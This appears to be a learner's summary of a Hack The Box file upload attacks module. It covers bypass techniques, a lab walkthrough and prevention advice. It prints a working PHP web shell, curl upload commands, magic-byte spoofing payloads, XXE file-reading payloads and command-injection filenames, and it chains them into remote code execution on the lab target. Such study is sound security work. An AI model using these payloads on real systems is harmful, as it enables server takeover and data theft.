# 📂 File Upload Attacks – Complete Module Documentation

This document summarizes everything covered in the **File Upload Attacks** module on Hack The Box.
It includes attack vectors, bypass techniques, practical exploitation steps, and security recommendations.

---

## 🧠 Table of Contents

1. [Introduction to File Upload Vulnerabilities](#introduction)
2. [Types of File Upload Attacks](#types)
3. [Basic Exploitation – No Validation](#basic)
4. [Client-Side Validation Bypass](#client)
5. [Blacklist Filters – Fuzzing Extensions](#blacklist)
6. [Whitelist Filters – Double Extensions & Null Byte](#whitelist)
7. [Content-Type & MIME-Type Spoofing](#content)
8. [Limited File Uploads – XSS, XXE, DoS](#limited)
9. [Other Upload Attacks (Injections, Directory Disclosure, Windows)](#other)
10. [Preventing File Upload Vulnerabilities](#prevention)
11. [Skills Assessment Walkthrough](#skills)

---

<a name="introduction"></a>
## 1. Introduction

File uploads are essential in modern web apps (profile pictures, documents, etc.).
**The risk**: If not properly filtered, attackers can upload malicious files to gain remote code execution (RCE) on the server.

**Key fact**: File upload vulnerabilities are frequently rated *High* or *Critical* in CVEs.

---

<a name="types"></a>
## 2. Types of File Upload Attacks

| Attack Type | Goal | Example |
|-------------|------|---------|
| **Arbitrary File Upload** | Upload any file (web shell, reverse shell) to get RCE. | Upload `shell.php` directly. |
| **Limited File Upload** | Even restricted extensions can lead to XSS, XXE, DoS. | Upload malicious SVG for XXE. |
| **Injection Attacks** | Inject commands in filenames to execute OS commands. | `file$(whoami).jpg` |
| **Directory Disclosure** | Force errors to reveal upload paths. | Duplicate filename, long name. |
| **Windows-Specific** | Exploit 8.3 naming, reserved names. | `CON`, `NUL`, `HAC~1.TXT` |

---

<a name="basic"></a>
## 3. Basic Exploitation – No Validation

If the application does **no validation** (front-end or back-end), simply:

1. Create a PHP web shell:
```php
<?php system($_REQUEST['cmd']); ?>
```
2. Upload as `shell.php`.
3. Access it at `/uploads/shell.php?cmd=id` to execute commands.

Example:
```bash
curl -F "uploadFile=@shell.php" http://target/upload.php
```

---

<a name="client"></a>
## 4. Client-Side Validation Bypass

**Problem**: The browser enforces file type (e.g., only images).
**Solution**: Since it's client-side, we can:

- Intercept and modify the upload request (Burp):
  Change `filename="image.png"` to `filename="shell.php"` and replace content.
- Disable JavaScript validation via DevTools:
  Remove `onchange="checkFile(this)"` from the `<input>` tag.

**Key**: Server-side validation must be present; otherwise, client-side checks are useless.

---

<a name="blacklist"></a>
## 5. Blacklist Filters – Fuzzing Extensions

A blacklist blocks known dangerous extensions (e.g., `.php`, `.phtml`).
**Flaw**: Blacklists are incomplete – they miss obscure extensions.

### Attack Steps
1. Fuzz the upload endpoint with a list of extensions (SecLists).
2. Look for extensions that do not trigger the block.
3. Common bypasses: `.phar`, `.php5`, `.inc`, `.phtml`.
4. Upload a shell using the allowed extension (e.g., `shell.phar`).

### Example Command (loop)
```bash
for ext in phar phtml php5 inc; do
  curl -F "uploadFile=@payload;filename=shell.$ext" http://target/upload.php
done
```

**Why works**: The server doesn't block all PHP-executable extensions.

---

<a name="whitelist"></a>
## 6. Whitelist Filters – Double Extensions & Null Byte

A whitelist allows only specific extensions (e.g., `.jpg`, `.png`).
**Flaw**: The regex may check only whether the filename contains the extension, not if it ends with it.

### Bypass Techniques

| Technique | Payload Example | When It Works |
|-----------|------------------|----------------|
| Double Extension | `shell.jpg.php` | Whitelist checks for `.jpg` anywhere. |
| Reverse Double Extension | `shell.php.jpg` | Whitelist checks final extension `.jpg`, but Apache misconfiguration parses `.php` anywhere. |
| Null Byte Injection | `shell.php%00.jpg` | PHP ≤5.x truncates at `%00`, storing as `shell.php`. |
| Character Injection | `shell.php%0a.jpg`, `shell.php:.jpg` (Windows) | Special chars cause filename misinterpretation. |

**Detection**: Fuzz for allowed extensions (e.g., `.jpg`), then try permutations with PHP extensions.

---

<a name="content"></a>
## 7. Content-Type & MIME-Type Spoofing

Servers may inspect:
- **Content-Type header** (client-controlled) → simply override it.
- **MIME-Type** (magic bytes) → first few bytes of the file.

### Bypass
1. Use a valid image header (e.g., `GIF8;`, `JPEG \xFF\xD8`).
2. Prepend it to your PHP code.
3. Set Content-Type to `image/gif` or `image/jpeg`.

Example:
```bash
echo -e "GIF8;\n<?php system(\$_REQUEST['cmd']); ?>" > payload
curl -F "uploadFile=@payload;filename=shell.phar.jpg;type=image/gif" http://target/upload.php
```

The server sees `GIF8` → accepts as image, but the `.phar.jpg` (or other) extension triggers PHP execution.

---

<a name="limited"></a>
## 8. Limited File Uploads – XSS, XXE, DoS

Even if RCE is not possible, allowed file types can introduce other vulnerabilities.

### XSS (Stored)
- HTML/JS upload: If `upload.html` is served, visiting it executes JS.
- Image metadata: Inject `exiftool -Comment='<script>alert(1)</script>' image.jpg`.
- SVG: Embed `<script>` tags in XML.

### XXE (XML External Entity)
SVG (XML-based) can read local files:
```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

PHP filter to read source code:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
```

### DoS
- Decompression bomb (ZIP) – nested archives.
- Pixel flood – manipulate image dimensions.
- Large file – fill disk space.

---

<a name="other"></a>
## 9. Other Upload Attacks

### Filename Injections
- OS Command: `file$(whoami).jpg` → if `mv` uses the name, command executes.
- SQL: `file';SELECT SLEEP(5);--.jpg`
- XSS: `<script>alert(1)</script>.jpg` (if filename is reflected).

### Directory Disclosure
Force errors by:
- Uploading a duplicate filename.
- Sending an overly long filename.
- Using reserved characters (`|`, `<`, `>`, `*`, `?`).

### Windows-Specific
- **8.3 Short Names**: `WEB~1.CON` may overwrite `web.conf`.
- **Reserved Names**: `CON`, `COM1`, `LPT1`, `NUL` – cause errors.

---

<a name="prevention"></a>
## 10. Preventing File Upload Vulnerabilities

A layered defense is essential. Below are actionable recommendations.

### Extension Validation
- Whitelist allowed extensions and blacklist dangerous ones.
- Use strict regex: `/^.*\.(jpg|jpeg|png|gif)$/` (must end with extension).

### Content Validation
- Validate Content-Type header and MIME-type (magic bytes).
- Ensure they match the allowed extension.

### Hide Upload Directory
- Do not expose `/uploads/` directly.
- Serve files via a download script (`download.php?id=...`) with:
  - Authorization checks.
  - `Content-Disposition: attachment`.
  - `X-Content-Type-Options: nosniff`.

### Rename Files
- Store files with random names (e.g., hash) and keep original names in database.
- This prevents direct access and injection via filenames.

### Server Hardening
- Disable dangerous functions in `php.ini`:
  `disable_functions = exec, shell_exec, system, passthru`.
- Limit file size.
- Hide errors – do not reveal paths or system details.
- Keep libraries updated (ImageMagick, ffmpeg, etc.).
- Use a WAF as a secondary layer.

### Additional
- Scan uploaded files for malware.
- Validate the file's actual content (e.g., `getimagesize` for images).
- Store uploaded files on a separate server/container.

---

<a name="skills"></a>
## 11. Skills Assessment Walkthrough

The lab: Upload a file to read `/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt`.

### Steps

1. Discover the upload form at `/contact/`.
   Endpoint: `/contact/upload.php`, field name: `uploadFile`.

2. Client-side validation – can be bypassed by sending raw requests.

3. Test valid image upload – PNG/JPEG works; server returns base64 of image.

4. Fuzz for allowed extensions – `.phar.jpg` was accepted (reverse double extension).

5. Use XXE to read source code – upload an SVG with:
```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

   This revealed:
   - Upload directory: `./user_feedback_submissions/`
   - Renaming pattern: `date('ymd') . '_' . basename($_FILES["uploadFile"]["name"])`
   - Blacklist: blocks `.php`, `.phps`, `.phtml`
   - Whitelist: allows 2-3 letter extensions (`.jpg`, `.png`, etc.)

6. Create payload – JPEG signature + PHP code:
```bash
printf "\xFF\xD8\xFF\xE0" > fake.jpg
echo -e "\n<?php system(\$_REQUEST['cmd']); ?>" >> fake.jpg
```

7. Upload with `shell.phar.jpg` – passes whitelist (ends with `.jpg`) and blacklist (`.phar` not blocked).

8. Find stored file – date from Date header: `260909` (09 Sep 2026).
   Full path: `/contact/user_feedback_submissions/260909_shell.phar.jpg`.

9. Execute commands:
```bash
curl http://target/contact/user_feedback_submissions/260909_shell.phar.jpg?cmd=id
```
   Returns `uid=33(www-data)` – RCE confirmed.

10. List root directory:
```bash
curl ...?cmd=ls%20-la%20/
```
    Found `flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt`.

11. Read flag:
```bash
curl ...?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
```
    (If garbled, use base64 encode and decode locally.)

### Security Issues Identified
- Weak blacklist – `.phar` not blocked.
- Weak whitelist – allows 2-3 letter extensions but does not enforce end-of-string strictly.
- Content-Type/MIME too permissive – any `image/` prefix accepted.
- Upload directory exposed – `/contact/user_feedback_submissions/` directly accessible.
- Original filename kept – allows execution.
- Dangerous functions enabled – `system()` callable.
- XXE vulnerability – SVG external entities allowed.
- Error messages may disclose paths.

### Recommended Fixes
- Block `.phar`, `.phtml`, `.php5` in blacklist.
- Use strict whitelist: `/^.*\.(jpg|jpeg|png|gif)$/`.
- Validate MIME type against a strict list (`image/jpeg`, `image/png`).
- Store files with random names and serve via download script.
- Disable `system()`, `exec()`.
- Disable external entities in XML parsing.
- Limit file size and scan for malware.

---

## 📌 Conclusion

File upload attacks are versatile and dangerous.
This module covered every layer of defense and how to bypass it – from extension checks to content validation and even advanced attacks like XXE.
Always remember: security is layered; never rely on a single control.
